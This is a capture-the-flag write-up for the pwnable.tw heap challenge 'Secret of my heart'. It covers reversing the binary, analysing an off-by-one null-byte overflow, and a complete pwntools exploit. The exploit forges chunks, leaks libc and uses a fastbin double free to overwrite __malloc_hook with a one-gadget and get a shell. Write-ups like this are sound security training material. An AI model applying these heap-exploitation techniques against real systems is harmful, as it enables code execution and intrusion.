---
title: Secret of my heart (400 pts) - pwnable.tw
date: 2025-09-30 22:09:42
tags: ['pwnable.tw']
---

## 0x1. Initial Reconnaissance 

### file
```
↪ file secret_of_my_heart
secret_of_my_heart: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=123aede7094ecfa8f50b3b34f3b9c754835d4e25, stripped
```

### checksec
```
↪ checksec --file=secret_of_my_heart
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	Partial	1		4		secret_of_my_heart
```

### ./secret_of_my_heart
```
↪ ./secret_of_my_heart
==================================
        Secret of my heart        
==================================
 1. Add a secret                  
 2. show a secret                 
 3. delete a secret               
 4. Exit                          
==================================
Your choice :1
Size of heart : 30
Name of heart :ndd
secret of my heart :I_am_a_spy
Done !

==================================
        Secret of my heart        
==================================
 1. Add a secret                  
 2. show a secret                 
 3. delete a secret               
 4. Exit                          
==================================
Your choice :2
Index :0
Index : 0
Size : 30
Name : ndd
Secret : I_am_a_spy

==================================
        Secret of my heart        
==================================
 1. Add a secret                  
 2. show a secret                 
 3. delete a secret               
 4. Exit                          
==================================
Your choice :3
Index :0
Done !

==================================
        Secret of my heart        
==================================
 1. Add a secret                  
 2. show a secret                 
 3. delete a secret               
 4. Exit                          
==================================
Your choice :4869
Your secret : 0xa6fe000
Good bye ~
```

## 0x2. Reverse Engineering

### main
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  sub_B60(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_1117();
      v3 = sub_CA9();
      if ( v3 != 3 )
        break;
      sub_106D();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
        sub_E34();
LABEL_15:
      puts("Invalid choice");
    }
    else if ( v3 == 1 )
    {
      sub_E6C();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_15;
      sub_F3C();
    }
  }
}
```

### Add a secret
```c
int sub_E6C()
{
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 99 )
      return puts("Fulled !!");
    if ( !*(_QWORD *)(unk_202018 + 48LL * i + 40) )
      break;
  }
  printf("Size of heart : ");
  v2 = (int)sub_CA9();
  if ( v2 > 0x100 )
    return puts("Too big !");
  sub_D27(unk_202018 + 48LL * i, v2);
  return puts("Done !");
}


_BYTE *__fastcall sub_D27(size_t *a1, size_t a2)
{
  _BYTE *result; // rax

  *a1 = a2;
  printf("Name of heart :");
  sub_C38(a1 + 1, 32LL);
  a1[5] = (size_t)malloc(a2);
  if ( !a1[5] )
  {
    puts("Allocate Error !");
    exit(0);
  }
  printf("secret of my heart :");
  result = (_BYTE *)(a1[5] + (int)sub_C38(a1[5], (unsigned int)a2));
  *result = 0;
  return result;
}
```

### Show a secret
```c
int sub_F3C()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("Index :");
  v1 = sub_CA9();
  if ( v1 > 0x63 )
  {
    puts("Out of bound !");
    exit(-2);
  }
  if ( !*(_QWORD *)(unk_202018 + 48LL * v1 + 40) )
    return puts("No such heap !");
  printf("Index : %d\n", v1);
  printf("Size : %lu\n", *(_QWORD *)(unk_202018 + 48LL * v1));
  printf("Name : %s\n", (const char *)(unk_202018 + 48LL * v1 + 8));
  return printf("Secret : %s\n", *(const char **)(unk_202018 + 48LL * v1 + 40));
}
```

### Delete a secret
```c
int sub_106D()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("Index :");
  v1 = sub_CA9();
  if ( v1 > 0x63 )
  {
    puts("Out of bound !");
    exit(-2);
  }
  if ( !*(_QWORD *)(unk_202018 + 48LL * v1 + 40) )
    return puts("No such heap !");
  sub_DE4(unk_202018 + 48LL * v1);
  return puts("Done !");
}


__int64 __fastcall sub_DE4(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)a1 = 0LL;
  memset((void *)(a1 + 8), 0, 0x20uLL);
  free(*(void **)(a1 + 40));
  result = a1;
  *(_QWORD *)(a1 + 40) = 0LL;
  return result;
}
```

## 0x3. Analysis

In this challenge, we can:
- Add a secret and store it into an array in somewhere (I don't know what it's called), the address of this array is stored in ```__bss_start + 8```. The secret field looks like that:
```c
struct secret{
    _int64 Size;
    char Name[32];
    _int64 *secret;
};
```

You can add up to 100 secrets, so you don't need to worry about the number you can add. Another noticeable thing is that after you write your secret into the allocated chunk, the code appends a null byte to the end of your secret, preventing heap leaks but causing other issues that we will discuss below.

- Show a secret, but when printing a name, the program prints everything up to the first null byte, so we can leak the heap address; the same applies to the secret.

- Delete a secret, just free the chunk, reset everything, preventing use-after-free bug.

## 0x4. Exploit

When you add a secret of 24 bytes, the program just allocates a chunk of 0x20 bytes. As a result, you can overwrite the ```prev_size``` and the first byte of ```size``` field of the next chunk. For example, they can overwrite ```prev_size``` with ```0x90``` and set ```size``` from ```0x111``` to ```0x100```, marking the previous chunk is unused and have the size of ```0x90```.

When I tried to found something in glibc 2.23, I found this:
```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

They will merge the chunk at ```current_chunk - prev_size``` into the current chunk, if the previous chunk is marked as unused. At first I thought about making a fake chunk, but there is no way to leak the libc since they add a null byte to the end of the secret. Then I thought why not do it in a real chunk ? 

You can follow my steps:

### Step 1: Setup 

- You can create 3 chunks A, B, C with the sizes of 225, 24 and 256 bytes respectively.
- Free chunk B and allocate it again to overwrite ```prev_size``` and ```size``` fields of chunk C. (Overwrite ```prev_size``` with the sum of chunk A, B's size)
- Merge chunk B into chunk A, because chunk B is marked as unused now, if you free chunk A, they will merge chunk B into chunk A.
```c
if (nextchunk != av->top) {
    /* get and clear inuse bit */
    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

    /* consolidate forward */
    if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd);
        size += nextsize;
    } else{
        clear_inuse_bit_at_offset(nextchunk, 0);
    }
    ...
}
```

- If you try to do as above, you could realise that you can't free chunk A, get segfault instead. This is because they call ```unlink``` function, which is to take the chunk from bin, and in this function they do that:
```c
FD = P->fd;								      
BK = P->bk;		
```

So, you have to make a fake fd and bk pointer for chunk B, that's why they allow us to get the address of heap easily. You can forge 2 fake chunks, that their fd and bk pointers point to chunk B, inside chunk A.

- After merging chunk B into chunk A, allocate a chunk of 256 bytes to get chunk A of 256 bytes.

### Step 2: Leak libc

- Because ```prev_inused``` bit of chunk C is marked again, you could free chunk B and allocate it again to ovewrite this bit.
- Free chunk C to merge chunk C into chunk A (remember to make fd, bk's pointers point to fake chunks).
- Chunk A now has the address of ```main_arena```, so showing the secret of chunk A to get the libc address.

### Step 3: Get shell

- Chunk A is now ```0x220``` bytes, so allocate a chunk of ```0x70``` bytes to get chunk A of ```0x70``` bytes.
- Allocate a chunk of ```0x70``` bytes again.
- Free chunk A, the chunk above, and chunk A respectively to trigger double-free bug.
- Make ```_malloc_hook``` become the head of ```0x70``` entry.
- Overwrite ```_malloc_hook``` with one gadget and get the shell.


### Exploit
```py
from pwn import *

exe = ELF("./secret_of_my_heart_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main")
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214")
    else:
        r = remote("chall.pwnable.tw", 10302)

    return r

def add_secret (p, size, name, secret):
    p.sendafter (b'Your choice :', b'1')
    p.sendafter (b'Size of heart : ', size)
    p.sendafter (b'Name of heart :', name)
    p.sendafter (b'secret of my heart :', secret)

def show_secret (p, id):
    p.sendafter (b'Your choice :', b'2')
    p.sendafter (b'Index :', id)

def delete_secret (p, id):
    p.sendafter (b'Your choice :', b'3')
    p.sendafter (b'Index :', id)

def Secret (p, id):
    p.sendafter (b'Your choice :', b'3869')

def main():
    p = conn()
    add_secret (p, b'24', b'A' * 32, b'DD') # 0
    show_secret (p, b'0')
    p.recvuntil (b'A' * 32)
    heap_address = u64 (p.recv (6) + b'\x00' * 2) - 0x10
    print ("The address of heap is: ", hex (heap_address))

    
    print ("1 -> 4 --------------------------------------------------------------------------------------")
    payload = p64 (0) * 2
    payload += p64 (0) + p64 (0x21) + p64 (heap_address + 0x110) + p64 (0)
    payload += p64 (0) + p64 (0x21) + p64 (0) + p64 (heap_address + 0x110)


    add_secret (p, b'225', b'dd', payload) # 1
    add_secret (p, b'24', b'DD', b'2222') # 2
    add_secret (p, b'256', b'DD', b'\x00' * 0xf0 + p64 (0) + p64 (0x41)) # 3
    add_secret (p, b'30', b'dd', b'4444') # 4

    delete_secret (p, b'2')
    add_secret (p, b'24', b'DD', p64 (heap_address + 0x60) + p64 (heap_address + 0x40) + p64 (0x110)) # 2

    delete_secret (p, b'1')
    delete_secret (p, b'2')

    print ("design structure to leak libc ----------------------------------------------------------------")

    payload = p64 (heap_address + 0x70) + p64 (heap_address + 0x50)
    payload += p64 (0) * 2
    payload += p64 (0) + p64 (0x21) + p64 (heap_address + 0x20) + p64 (0)
    payload += p64 (0) + p64 (0x21) + p64 (0) + p64 (heap_address + 0x20)

    add_secret (p, b'256', 'dd', payload) # 1
    add_secret (p, b'24', b'DD', b'A' * 16 + p64 (0x110)) # 2

    print ("leak libc address --------------------------------------------------------------------------------")

    delete_secret (p, b'3') 
    show_secret (p, b'1')
    p.recvuntil (b'Secret : ')
    libc.address = u64 (p.recv (6) + b'\x00' * 2) - libc.symbols['main_arena'] - 88
    print ("The libc address is: ", hex (libc.address))

    print ("Get shell -------------------------------------------------------------------------------------------")
    # Trigger double-free bug to overwrite malloc_hook

    add_secret (p, b'104', b'DD', b'ndd') # 3
    add_secret (p, b'104', b'ndd', b'123') # 5

    delete_secret (p, b'3')
    delete_secret (p, b'5')
    delete_secret (p, b'1')

    add_secret (p, b'104', b'dd', p64 (libc.symbols['__malloc_hook'] - 0x23)) # 1
    add_secret (p, b'104', b'dd', b'1111') # 3
    add_secret (p, b'104', b'ndd', b'2222') # 5
    add_secret (p, b'104', b'DD', b'\x00' * 0x13 + p64 (libc.address + 0xef6c4)) # 6

    delete_secret (p, b'5')
    delete_secret (p, b'1')

    p.interactive()


if __name__ == "__main__":
    main()
```




